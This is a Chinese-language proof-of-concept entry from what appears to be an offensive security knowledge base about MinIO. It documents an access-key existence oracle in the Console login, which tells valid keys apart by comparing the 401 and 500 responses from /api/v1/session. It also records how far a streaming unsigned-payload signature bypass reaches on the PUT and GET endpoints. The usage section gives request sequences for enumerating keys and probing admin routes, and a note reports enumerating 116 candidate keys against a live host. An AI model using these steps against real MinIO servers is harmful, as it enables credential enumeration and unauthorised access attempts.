# MinIO 9001 login 的 AK 存在性 oracle 与 GET 面 streaming 绕过的边界（PUT 免 AK 校验，GET 不免）

- **code**: minio-console-ak-existence-oracle-and-get-bypass-boundary
- **kind**: poc
- **category**: auth-bypass
- **component**: MinIO（Console :9001 登录 oracle + S3 :9000 GET 面）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-03 于 192.0.2.15（MinIO 9000 + Console 9001）直连实测：116 个候选 AK 全表只有 omnihelm 回 500 EXISTS（其余 115 个 401 NOT_EXIST），12 条同源 SK 猜测全 500；admin 路由 PUT add-service-account/add-user 对 omnihelm 全 403 AccessDenied；GET /?list-type=2 不带 Authorization 回 403 AccessDenied（进 handler），带 bogus AK 回 InvalidAccessKeyId。脚本与日志 D:/ARTEX/data/tasks/612/i7597/ak_enum*.log、admin_matrix.log、get_probe2.log。
- **tags**: minio,console,ak-enumeration,oracle,session,sigv4,streaming-unsigned-payload-trailer,get-vs-put,identity-gate
- **created_at**: 2026-11-02T17:21:42.150Z
- **engine**: http://192.0.2.15:9001

## 描述

两点边界知识：①MinIO Console 登录可做 AK 存在性 oracle（login 恒 204 且对任意 AK 都发 Set-Cookie，真正判据在 GET /api/v1/session 的 401 does-not-exist vs 500 security-token-invalid）；②CVE-2026-41145 的 streaming 免签在 PUT 上连 AK 存在性都不校验（无头=不存在 AK=真 AK 全回同一 AccessDenied），但 GET 面只有完全不带 Authorization 才免签名，一旦带 AK 就会回 InvalidAccessKeyId——即 GET 只免签名不免 AK 校验。Enumeration 之后仍卡在身份闸，需真实 admin 凭据。

## 用法

```
// 1) AK 存在性 oracle（先 login 拿 cookie，再打 session）
r = POST http://<host>:9001/api/v1/login {"accessKey":"<AK>","secretKey":"<fixed-random>","sts":"off"}  // 恒 204 + Set-Cookie
r2 = GET /api/v1/session  Cookie: <cookie>
// 500 "security token included in the request is invalid" = AK 存在但 SK 错
// 401 "The Access Key Id you provided does not exist" = AK 不存在
// 2) PUT 面免签（含免 AK 校验）：PUT /minio/admin/v3/add-service-account 加 STREAMING-UNSIGNED-PAYLOAD-TRAILER + aws-chunked 分帧 → 403 AccessDenied
// 3) GET 面边界：GET /?list-type=2 同上分帧但【不带 Authorization】→ 403 AccessDenied（进 handler）；带上任意 AK → 403 InvalidAccessKeyId。
// 注意别只看 login 状态码（204 对任意 AK 都成立），否则会把所有 AK 误判成存在。
```
